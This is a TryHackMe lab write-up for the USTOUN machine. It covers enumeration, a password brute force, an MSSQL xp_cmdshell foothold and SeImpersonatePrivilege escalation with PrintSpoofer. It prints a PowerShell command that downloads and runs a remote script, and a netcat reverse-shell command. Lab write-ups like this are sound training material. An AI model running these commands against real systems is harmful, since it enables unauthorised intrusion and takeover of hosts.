---
title: USTOUN TryHackMe Writeup
tags: [writeup,rest,python,tryhackme,linux,api,suid]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/1.png)

## Scanning
We perform a quick and aggressive scan (**not recommended in real environments**) to detect open ports on the server.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/2.png)

Then, knowing the ports, we will launch an nmap with scripts and versions.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/3.png)


## Enumeration
We test if we can authenticate with an anonymous user, we see that we cannot.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/4.png)

Another test that I usually do in real environments, is to test with the *"guest"* user, which is usually enabled by default. As you can see in the evidence, we can use it to get the users by their **RID**.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/5.png)

We create a list of the most relevant users obtained and brute force the *"rockyou"* dictionary. We will get some credentials.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/6.png)


## Exploitation
After several tests in different services, we found that the credentials are functional in the *"Microsoft SQL Server"* service, from here we will be able to load a reverse shell.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/7.png)

```powershell
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.11.30.149:8000/m3.ps1\")
```

#### Reverse shell connection

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/8.png)

## Privilege Escalation
We tried to read the user flag, but we do not have access. We check the user's privileges and see that we could escalate by impersonating the user **"Administrator"** using **"SeImpersonatePrivilege"**.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/9.png)

We identify the exact version of Windows installed.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/10.png)

We download the **PrintSpoofer** exploit from this [github](https://github.com/itm4n/PrintSpoofer), we also download **netcat** to the victim machine and run the following command putting a listening **netcat** on our Kali.

```
.\PrintSpoofer.exe -c "C:\users\SVC-Kerb.DC01\Videos\nc.exe 10.11.30.149 444 -e cmd"
```

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/13.png)

#### Reverse shell as Administrator

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/13-2.png)

And now we read the two flags.

#### User flag

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/15.png)

#### Administrator flag

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/USTOUN/14.png)




